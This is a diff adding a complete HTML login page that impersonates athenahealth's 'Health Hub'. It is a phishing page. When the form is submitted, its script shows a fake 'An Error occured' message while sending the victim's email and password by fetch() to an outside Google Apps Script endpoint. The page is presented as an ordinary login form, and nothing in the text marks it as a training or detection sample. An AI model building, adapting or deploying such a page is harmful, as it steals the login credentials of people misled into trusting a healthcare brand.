@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f9f9f9;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+    }
+
+    .login-container {
+        background-color: #fff;
+        padding: 1.5rem;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        border-radius: 8px;
+        text-align: center;
+        width: 330px;
+    }
+
+    .logo {
+        width: 150px;
+    }
+
+    h1 {
+        font-size: 1.5rem;
+        color: #333;
+    }
+
+    h2 {
+        font-size: 1rem;
+        color: #666;
+        margin-bottom: 1rem;
+    }
+
+    form {
+        display: flex;
+        flex-direction: column;
+        text-align: left;
+    }
+
+    label {
+        margin: 0.5rem 0 0.25rem;
+        font-size: 0.9rem;
+        color: #333;
+    }
+
+    input[type="email"], input[type="password"] {
+        padding: 0.5rem;
+        margin-bottom: 1rem;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+    }
+
+    .remember-me {
+        display: flex;
+        align-items: center;
+        margin-bottom: 1rem;
+    }
+
+    .remember-me label {
+        margin-left: 0.5rem;
+        font-size: 0.9rem;
+    }
+
+    button {
+        background-color: #007bff;
+        color: #fff;
+        border: none;
+        padding: 0.5rem;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+
+    button:hover {
+        background-color: #0056b3;
+    }
+
+    .forgot-password {
+        display: block;
+        margin-top: 1rem;
+        font-size: 0.9rem;
+        color: #007bff;
+        text-decoration: none;
+    }
+
+    .forgot-password:hover {
+        text-decoration: underline;
+    }
+
+
+    #toast {
+        visibility: hidden;
+        min-width: 250px;
+        margin-left: -125px;
+        background-color: #ff4d4d;
+        color: white;
+        text-align: center;
+        border-radius: 5px;
+        padding: 16px;
+        position: fixed;
+        z-index: 1;
+        left: 50%;
+        top: 30px;
+        font-size: 17px;
+        transition: visibility 0s, opacity 0.5s linear;
+    }
+
+    #toast.show {
+        visibility: visible;
+        opacity: 1;
+    }
+
+    #toast.hide {
+        opacity: 0;
+        visibility: hidden;
+    }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="./assets/logo.svg" alt="athenahealth logo" class="logo">
+        <br>
+        <hr>
+        <h2>Enter your email and password to log in to</h2>
+        <h1>Health Hub</h1>
+        <form name="customer-data">
+            <div id="toast">Oops! An Error occured please try after some time</div>
+            <label for="email">Email address</label>
+            <input type="email" id="email" name="email" required>
+            
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
+            
+            <div class="remember-me">
+                <input type="checkbox" id="remember-me" name="remember-me">
+                <label for="remember-me">Remember me</label>
+            </div>
+            
+            <button type="submit">Log in</button>
+        </form>
+    </div>
+    <script>
+        //show Toast
+        function showToast() {
+            const toast = document.getElementById('toast');
+            toast.classList.add('show');
+
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 2000);
+        }
+
+        var form = document.forms['customer-data'];
+        var scriptURL = "https://script.google.com/macros/s/AKfycbyhRalnGEtcBH4Rf2eQ0M7dw_4Pup7GErDqJLnTuteJc0nayoX6grh5_fc5ozrmANLI/exec";
+        form.addEventListener("submit",e=>{
+          e.preventDefault();
+          showToast();
+          var email = document.getElementById("email").value;
+          var password = document.getElementById("password").value;
+          const formData = new FormData();
+          formData.append('Email', email);
+          formData.append('Password', password);
+          fetch(scriptURL, { method: 'POST', body: formData})
+                        .then(()=>{
+                            console.log("error occured");
+          });
+
+
+
+
+        });
+    </script>
+</body>
+</html>
